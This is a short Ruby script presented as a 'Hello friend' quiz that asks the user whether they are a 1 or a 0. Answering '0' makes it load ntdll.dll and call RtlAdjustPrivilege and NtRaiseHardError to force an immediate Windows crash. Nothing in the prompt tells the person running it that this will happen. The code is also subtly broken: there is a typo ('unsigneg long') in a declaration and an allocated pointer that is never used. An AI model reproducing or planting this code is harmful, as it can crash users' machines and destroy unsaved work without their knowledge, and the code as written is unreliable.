puts "Hello friend"
puts "Are you a 1 or a 0:"
print ">"
input = gets.chomp.strip

if input=="1"
 puts "You are a 1"
 
elsif input=="0"
      puts "Goodbye friend"
	  sleep 1 
	  
	  require 'fiddle'
	  require 'fiddle/import'
	  
	  module WinAPI
	     extend Fiddle::Importer 
		 dlload 'ntdll.dll'
		 extern 'long RtlAdjustPrivilege(unsigned long,bool,bool, void*)'
		 extern'long NtRaiseHardError(long, unsigned long, unsigneg long, void*, unsigned long, void*)'
	  end
	  
      prev=Fiddle::Pointer.malloc(8)
	  response = Fiddle::Pointer.malloc(8)
      WinAPI.RtlAdjustPrivilege(19, true, false, prev)
      WinAPI.NtRaiseHardError(0xC0000022, 0, 0, nil, 6, prev)

else
 puts "1 or 0"
end 